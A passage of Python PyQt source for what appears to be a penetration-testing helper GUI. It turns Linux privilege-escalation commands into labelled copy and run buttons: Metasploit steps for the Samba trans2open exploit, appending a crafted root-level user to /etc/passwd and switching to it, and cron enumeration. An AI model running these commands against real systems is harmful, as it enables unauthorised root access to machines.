        self.lpe_MeterpreterForwarding_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_MeterpreterForwarding_Scan2.text() + "; bash"
        self.lpe_MeterpreterForwarding_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_MeterpreterForwarding_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_MeterpreterForwarding_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan2_Copy)
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan2_Run)
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan2)
        self.tab3_container_layout.insertLayout(145, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_MeterpreterForwarding_Scan3
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan3'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan3)
            self.lpe_MeterpreterForwarding_Scan3.deleteLater()
        self.lpe_MeterpreterForwarding_Scan3 = QLabel("use exploit/linux/samba/trans2open")
        self.lpe_MeterpreterForwarding_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_MeterpreterForwarding_Scan3 copy button
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan3_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan3_Copy)
            self.lpe_MeterpreterForwarding_Scan3_Copy.deleteLater()
        self.lpe_MeterpreterForwarding_Scan3_Copy = QPushButton()
        self.lpe_MeterpreterForwarding_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_MeterpreterForwarding_Scan3_Copy.setFixedSize(QSize(20,20))
        self.lpe_MeterpreterForwarding_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_MeterpreterForwarding_Scan3.text()))
        self.lpe_MeterpreterForwarding_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_MeterpreterForwarding_Scan3 run button
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan3_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan3_Run)
            self.lpe_MeterpreterForwarding_Scan3_Run.deleteLater()
        self.lpe_MeterpreterForwarding_Scan3_Run = QPushButton()
        self.lpe_MeterpreterForwarding_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_MeterpreterForwarding_Scan3_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_MeterpreterForwarding_Scan3.text() + "; bash"
        self.lpe_MeterpreterForwarding_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_MeterpreterForwarding_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_MeterpreterForwarding_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan3_Copy)
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan3_Run)
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan3)
        self.tab3_container_layout.insertLayout(146, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_MeterpreterForwarding_Scan4
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan4'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan4)
            self.lpe_MeterpreterForwarding_Scan4.deleteLater()
        self.lpe_MeterpreterForwarding_Scan4 = QLabel("set RHOSTS 0.0.0.0")
        self.lpe_MeterpreterForwarding_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_MeterpreterForwarding_Scan4 copy button
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan4_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan4_Copy)
            self.lpe_MeterpreterForwarding_Scan4_Copy.deleteLater()
        self.lpe_MeterpreterForwarding_Scan4_Copy = QPushButton()
        self.lpe_MeterpreterForwarding_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_MeterpreterForwarding_Scan4_Copy.setFixedSize(QSize(20,20))
        self.lpe_MeterpreterForwarding_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_MeterpreterForwarding_Scan4.text()))
        self.lpe_MeterpreterForwarding_Scan4_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_MeterpreterForwarding_Scan4 run button
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan4_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan4_Run)
            self.lpe_MeterpreterForwarding_Scan4_Run.deleteLater()
        self.lpe_MeterpreterForwarding_Scan4_Run = QPushButton()
        self.lpe_MeterpreterForwarding_Scan4_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_MeterpreterForwarding_Scan4_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_MeterpreterForwarding_Scan4.text() + "; bash"
        self.lpe_MeterpreterForwarding_Scan4_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_MeterpreterForwarding_Scan4_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_MeterpreterForwarding_Scan4 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan4_Copy)
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan4_Run)
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan4)
        self.tab3_container_layout.insertLayout(147, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_MeterpreterForwarding_Scan5
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan5'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan5)
            self.lpe_MeterpreterForwarding_Scan5.deleteLater()
        self.lpe_MeterpreterForwarding_Scan5 = QLabel("set RPORT " + self.rport)
        self.lpe_MeterpreterForwarding_Scan5.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_MeterpreterForwarding_Scan5 copy button
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan5_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan5_Copy)
            self.lpe_MeterpreterForwarding_Scan5_Copy.deleteLater()
        self.lpe_MeterpreterForwarding_Scan5_Copy = QPushButton()
        self.lpe_MeterpreterForwarding_Scan5_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_MeterpreterForwarding_Scan5_Copy.setFixedSize(QSize(20,20))
        self.lpe_MeterpreterForwarding_Scan5_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_MeterpreterForwarding_Scan5.text()))
        self.lpe_MeterpreterForwarding_Scan5_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_MeterpreterForwarding_Scan5 run button
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan5_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan5_Run)
            self.lpe_MeterpreterForwarding_Scan5_Run.deleteLater()
        self.lpe_MeterpreterForwarding_Scan5_Run = QPushButton()
        self.lpe_MeterpreterForwarding_Scan5_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_MeterpreterForwarding_Scan5_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_MeterpreterForwarding_Scan5.text() + "; bash"
        self.lpe_MeterpreterForwarding_Scan5_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_MeterpreterForwarding_Scan5_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_MeterpreterForwarding_Scan5 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan5_Copy)
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan5_Run)
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan5)
        self.tab3_container_layout.insertLayout(148, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_MeterpreterForwarding_Scan6
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan6'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan6)
            self.lpe_MeterpreterForwarding_Scan6.deleteLater()
        self.lpe_MeterpreterForwarding_Scan6 = QLabel("run")
        self.lpe_MeterpreterForwarding_Scan6.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_MeterpreterForwarding_Scan6 copy button
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan6_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan6_Copy)
            self.lpe_MeterpreterForwarding_Scan6_Copy.deleteLater()
        self.lpe_MeterpreterForwarding_Scan6_Copy = QPushButton()
        self.lpe_MeterpreterForwarding_Scan6_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_MeterpreterForwarding_Scan6_Copy.setFixedSize(QSize(20,20))
        self.lpe_MeterpreterForwarding_Scan6_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_MeterpreterForwarding_Scan6.text()))
        self.lpe_MeterpreterForwarding_Scan6_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_MeterpreterForwarding_Scan6 run button
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan6_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan6_Run)
            self.lpe_MeterpreterForwarding_Scan6_Run.deleteLater()
        self.lpe_MeterpreterForwarding_Scan6_Run = QPushButton()
        self.lpe_MeterpreterForwarding_Scan6_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_MeterpreterForwarding_Scan6_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_MeterpreterForwarding_Scan6.text() + "; bash"
        self.lpe_MeterpreterForwarding_Scan6_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_MeterpreterForwarding_Scan6_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_MeterpreterForwarding_Scan6 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan6_Copy)
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan6_Run)
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan6)
        self.tab3_container_layout.insertLayout(149, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_meterpreterForward_divider 1
        if hasattr(self, 'lpe_meterpreterForward_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_meterpreterForward_divider1)
            self.lpe_meterpreterForward_divider1.deleteLater()
        self.lpe_meterpreterForward_divider1 = QFrame()
        self.lpe_meterpreterForward_divider1.setFrameShape(QFrame.HLine)
        self.lpe_meterpreterForward_divider1.setLineWidth(3)
        self.lpe_meterpreterForward_divider1.setStyleSheet("color: #20C20E;")

        # lpe_meterpreterForward_divider2
        if hasattr(self, 'lpe_meterpreterForward_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_meterpreterForward_divider2)
            self.lpe_meterpreterForward_divider2.deleteLater()
        self.lpe_meterpreterForward_divider2 = QFrame()
        self.lpe_meterpreterForward_divider2.setFrameShape(QFrame.HLine)
        self.lpe_meterpreterForward_divider2.setLineWidth(3)
        self.lpe_meterpreterForward_divider2.setStyleSheet("color: #20C20E;")

        # lpe_meterpreterForward_spacer1
        if hasattr(self, 'lpe_meterpreterForward_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_meterpreterForward_spacer1)
            self.lpe_meterpreterForward_spacer1.deleteLater()
        self.lpe_meterpreterForward_spacer1 = QLabel()
        self.lpe_meterpreterForward_spacer1.setFixedWidth(40)
        self.lpe_meterpreterForward_spacer1.setFixedHeight(50)

        # lpe_meterpreterForward_spacer2
        if hasattr(self, 'lpe_meterpreterForward_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_meterpreterForward_spacer2)
            self.lpe_meterpreterForward_spacer2.deleteLater()
        self.lpe_meterpreterForward_spacer2 = QLabel()
        self.lpe_meterpreterForward_spacer2.setFixedWidth(40)
        self.lpe_meterpreterForward_spacer2.setFixedHeight(50)

        # lpe_meterpreterForward_spacer & divider layout
        self.tab3_container_layout.insertWidget(150, self.lpe_meterpreterForward_spacer1)
        self.tab3_container_layout.insertWidget(151, self.lpe_meterpreterForward_divider1)
        self.tab3_container_layout.insertWidget(152, self.lpe_meterpreterForward_divider2)
        self.tab3_container_layout.insertWidget(153, self.lpe_meterpreterForward_spacer2)
        self.tab3_container_layout.addStretch()

# lpe_passwd
        if hasattr(self, 'lpe_passwd'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd)
            self.lpe_passwd.deleteLater()
        self.lpe_passwd = QLabel("[+ Write Priv for /etc/passwd?]")
        self.lpe_passwd.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(154,self.lpe_passwd)

        # lpe_passwd_Scan1
        if hasattr(self, 'lpe_passwd_Scan1'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd_Scan1)
            self.lpe_passwd_Scan1.deleteLater()
        self.lpe_passwd_Scan1 = QLabel(f"openssl passwd -1")
        self.lpe_passwd_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_passwd_Scan1 copy button
        if hasattr(self, 'lpe_passwd_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd_Scan1_Copy)
            self.lpe_passwd_Scan1_Copy.deleteLater()
        self.lpe_passwd_Scan1_Copy = QPushButton()
        self.lpe_passwd_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_passwd_Scan1_Copy.setFixedSize(QSize(20,20))
        self.lpe_passwd_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_passwd_Scan1.text()))
        self.lpe_passwd_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_passwd_Scan1 run button
        if hasattr(self, 'lpe_passwd_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd_Scan1_Run)
            self.lpe_passwd_Scan1_Run.deleteLater()
        self.lpe_passwd_Scan1_Run = QPushButton()
        self.lpe_passwd_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_passwd_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_passwd_Scan1.text() + "; bash"
        self.lpe_passwd_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_passwd_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_passwd_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_passwd_Scan1_Copy)
        label_layout.addWidget(self.lpe_passwd_Scan1_Run)
        label_layout.addWidget(self.lpe_passwd_Scan1)
        self.tab3_container_layout.insertLayout(155, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_passwd_Scan2
        if hasattr(self, 'lpe_passwd_Scan2'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd_Scan2)
            self.lpe_passwd_Scan2.deleteLater()
        self.lpe_passwd_Scan2 = QLabel(f"password123!")
        self.lpe_passwd_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_passwd_Scan2 copy button
        if hasattr(self, 'lpe_passwd_Scan2_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd_Scan2_Copy)
            self.lpe_passwd_Scan2_Copy.deleteLater()
        self.lpe_passwd_Scan2_Copy = QPushButton()
        self.lpe_passwd_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_passwd_Scan2_Copy.setFixedSize(QSize(20,20))
        self.lpe_passwd_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_passwd_Scan2.text()))
        self.lpe_passwd_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_passwd_Scan2 run button
        if hasattr(self, 'lpe_passwd_Scan2_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd_Scan2_Run)
            self.lpe_passwd_Scan2_Run.deleteLater()
        self.lpe_passwd_Scan2_Run = QPushButton()
        self.lpe_passwd_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_passwd_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_passwd_Scan2.text() + "; bash"
        self.lpe_passwd_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_passwd_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_passwd_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_passwd_Scan2_Copy)
        label_layout.addWidget(self.lpe_passwd_Scan2_Run)
        label_layout.addWidget(self.lpe_passwd_Scan2)
        self.tab3_container_layout.insertLayout(156, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_passwd_Scan3
        if hasattr(self, 'lpe_passwd_Scan3'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd_Scan3)
            self.lpe_passwd_Scan3.deleteLater()
        self.lpe_passwd_Scan3 = QLabel("echo 'user1:<PASTE HASH>:user1:/home/user1:/bin/bash' >> /etc/passwd")
        self.lpe_passwd_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_passwd_Scan3 copy button
        if hasattr(self, 'lpe_passwd_Scan3_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd_Scan3_Copy)
            self.lpe_passwd_Scan3_Copy.deleteLater()
        self.lpe_passwd_Scan3_Copy = QPushButton()
        self.lpe_passwd_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_passwd_Scan3_Copy.setFixedSize(QSize(20,20))
        self.lpe_passwd_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_passwd_Scan3.text()))
        self.lpe_passwd_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_passwd_Scan3 run button
        if hasattr(self, 'lpe_passwd_Scan3_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd_Scan3_Run)
            self.lpe_passwd_Scan3_Run.deleteLater()
        self.lpe_passwd_Scan3_Run = QPushButton()
        self.lpe_passwd_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_passwd_Scan3_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_passwd_Scan3.text() + "; bash"
        self.lpe_passwd_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_passwd_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_passwd_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_passwd_Scan3_Copy)
        label_layout.addWidget(self.lpe_passwd_Scan3_Run)
        label_layout.addWidget(self.lpe_passwd_Scan3)
        self.tab3_container_layout.insertLayout(157, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_passwd_Scan4
        if hasattr(self, 'lpe_passwd_Scan4'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd_Scan4)
            self.lpe_passwd_Scan4.deleteLater()
        self.lpe_passwd_Scan4 = QLabel("su user1")
        self.lpe_passwd_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_passwd_Scan4 copy button
        if hasattr(self, 'lpe_passwd_Scan4_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd_Scan4_Copy)
            self.lpe_passwd_Scan4_Copy.deleteLater()
        self.lpe_passwd_Scan4_Copy = QPushButton()
        self.lpe_passwd_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_passwd_Scan4_Copy.setFixedSize(QSize(20,20))
        self.lpe_passwd_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_passwd_Scan4.text()))
        self.lpe_passwd_Scan4_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_passwd_Scan4 run button
        if hasattr(self, 'lpe_passwd_Scan4_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd_Scan4_Run)
            self.lpe_passwd_Scan4_Run.deleteLater()
        self.lpe_passwd_Scan4_Run = QPushButton()
        self.lpe_passwd_Scan4_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_passwd_Scan4_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_passwd_Scan4.text() + "; bash"
        self.lpe_passwd_Scan4_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_passwd_Scan4_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_passwd_Scan4 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_passwd_Scan4_Copy)
        label_layout.addWidget(self.lpe_passwd_Scan4_Run)
        label_layout.addWidget(self.lpe_passwd_Scan4)
        self.tab3_container_layout.insertLayout(158, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_passwd_divider 1
        if hasattr(self, 'lpe_passwd_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd_divider1)
            self.lpe_passwd_divider1.deleteLater()
        self.lpe_passwd_divider1 = QFrame()
        self.lpe_passwd_divider1.setFrameShape(QFrame.HLine)
        self.lpe_passwd_divider1.setLineWidth(3)
        self.lpe_passwd_divider1.setStyleSheet("color: #20C20E;")

        # lpe_passwd_divider2
        if hasattr(self, 'lpe_passwd_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd_divider2)
            self.lpe_passwd_divider2.deleteLater()
        self.lpe_passwd_divider2 = QFrame()
        self.lpe_passwd_divider2.setFrameShape(QFrame.HLine)
        self.lpe_passwd_divider2.setLineWidth(3)
        self.lpe_passwd_divider2.setStyleSheet("color: #20C20E;")

        # lpe_passwd_spacer1
        if hasattr(self, 'lpe_passwd_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd_spacer1)
            self.lpe_passwd_spacer1.deleteLater()
        self.lpe_passwd_spacer1 = QLabel()
        self.lpe_passwd_spacer1.setFixedWidth(40)
        self.lpe_passwd_spacer1.setFixedHeight(50)

        # lpe_passwd_spacer2
        if hasattr(self, 'lpe_passwd_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_passwd_spacer2)
            self.lpe_passwd_spacer2.deleteLater()
        self.lpe_passwd_spacer2 = QLabel()
        self.lpe_passwd_spacer2.setFixedWidth(40)
        self.lpe_passwd_spacer2.setFixedHeight(50)

        # lpe_passwd_spacer & divider layout
        self.tab3_container_layout.insertWidget(159, self.lpe_passwd_spacer1)
        self.tab3_container_layout.insertWidget(160, self.lpe_passwd_divider1)
        self.tab3_container_layout.insertWidget(161, self.lpe_passwd_divider2)
        self.tab3_container_layout.insertWidget(162, self.lpe_passwd_spacer2)
        self.tab3_container_layout.addStretch()

# lpe_cron
        if hasattr(self, 'lpe_cron'):
            self.tab3_container_layout.removeWidget(self.lpe_cron)
            self.lpe_cron.deleteLater()
        self.lpe_cron = QLabel("[+ Cron]")
        self.lpe_cron.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(163,self.lpe_cron)

        # lpe_cron_Scan1
        if hasattr(self, 'lpe_cron_Scan1'):
            self.tab3_container_layout.removeWidget(self.lpe_cron_Scan1)
            self.lpe_cron_Scan1.deleteLater()
        self.lpe_cron_Scan1 = QLabel(f"crontab –u root –l")
        self.lpe_cron_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_cron_Scan1 copy button
        if hasattr(self, 'lpe_cron_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_cron_Scan1_Copy)
            self.lpe_cron_Scan1_Copy.deleteLater()
        self.lpe_cron_Scan1_Copy = QPushButton()
        self.lpe_cron_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_cron_Scan1_Copy.setFixedSize(QSize(20,20))
        self.lpe_cron_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_cron_Scan1.text()))
        self.lpe_cron_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_cron_Scan1 run button
        if hasattr(self, 'lpe_cron_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_cron_Scan1_Run)
            self.lpe_cron_Scan1_Run.deleteLater()
        self.lpe_cron_Scan1_Run = QPushButton()
        self.lpe_cron_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_cron_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_cron_Scan1.text() + "; bash"
        self.lpe_cron_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_cron_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_cron_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_cron_Scan1_Copy)
        label_layout.addWidget(self.lpe_cron_Scan1_Run)
        label_layout.addWidget(self.lpe_cron_Scan1)
        self.tab3_container_layout.insertLayout(164, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_cron_Scan2
        if hasattr(self, 'lpe_cron_Scan2'):
            self.tab3_container_layout.removeWidget(self.lpe_cron_Scan2)
            self.lpe_cron_Scan2.deleteLater()
        self.lpe_cron_Scan2 = QLabel(f"cat /etc/crontab")
        self.lpe_cron_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_cron_Scan2 copy button
        if hasattr(self, 'lpe_cron_Scan2_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_cron_Scan2_Copy)
            self.lpe_cron_Scan2_Copy.deleteLater()
        self.lpe_cron_Scan2_Copy = QPushButton()
        self.lpe_cron_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_cron_Scan2_Copy.setFixedSize(QSize(20,20))
        self.lpe_cron_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_cron_Scan2.text()))
        self.lpe_cron_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_cron_Scan2 run button
        if hasattr(self, 'lpe_cron_Scan2_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_cron_Scan2_Run)
            self.lpe_cron_Scan2_Run.deleteLater()
        self.lpe_cron_Scan2_Run = QPushButton()
        self.lpe_cron_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_cron_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_cron_Scan2.text() + "; bash"
        self.lpe_cron_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_cron_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_cron_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_cron_Scan2_Copy)
        label_layout.addWidget(self.lpe_cron_Scan2_Run)
        label_layout.addWidget(self.lpe_cron_Scan2)
        self.tab3_container_layout.insertLayout(165, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_cron_Scan3
        if hasattr(self, 'lpe_cron_Scan3'):
            self.tab3_container_layout.removeWidget(self.lpe_cron_Scan3)
            self.lpe_cron_Scan3.deleteLater()
        self.lpe_cron_Scan3 = QLabel(f"ls /etc/cron.*")
        self.lpe_cron_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_cron_Scan3 copy button
        if hasattr(self, 'lpe_cron_Scan3_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_cron_Scan3_Copy)
            self.lpe_cron_Scan3_Copy.deleteLater()
        self.lpe_cron_Scan3_Copy = QPushButton()
        self.lpe_cron_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_cron_Scan3_Copy.setFixedSize(QSize(20,20))
        self.lpe_cron_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_cron_Scan3.text()))
        self.lpe_cron_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_cron_Scan3 run button
        if hasattr(self, 'lpe_cron_Scan3_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_cron_Scan3_Run)
            self.lpe_cron_Scan3_Run.deleteLater()
        self.lpe_cron_Scan3_Run = QPushButton()
        self.lpe_cron_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_cron_Scan3_Run.setFixedSize(QSize(20,20))
